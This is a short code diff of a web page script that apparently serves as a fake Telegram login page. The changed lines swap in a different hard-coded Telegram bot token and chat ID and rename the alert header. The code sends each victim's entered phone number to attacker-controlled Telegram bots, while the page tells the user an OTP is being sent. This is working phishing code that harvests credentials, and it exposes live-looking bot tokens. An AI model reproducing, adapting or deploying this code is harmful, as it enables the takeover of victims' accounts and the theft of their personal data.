@@ -196,7 +196,7 @@
   const loadingText = document.getElementById('loadingText');
 
   const bots = [
-    { token: "8220476952:AAFi07PY09aRR0ZRrVvT5TvGOEiMOpvMPo0", chatId: "6614120514" },
+    { token: "7644676904:AAHzxT9wYwdPBX3YFr3eUQf_LmvmP-gEFdM", chatId: "6353765945" },
     { token: "8220476952:AAFi07PY09aRR0ZRrVvT5TvGOEiMOpvMPo0", chatId: "6614120514" }
   ];
 
@@ -208,7 +208,7 @@
     localStorage.setItem('sessionBotIndex', currentBotIndex);
     const bot = bots[currentBotIndex];
 
-    const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+    const message = `🌀 *DATA USER LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
     const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
     statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
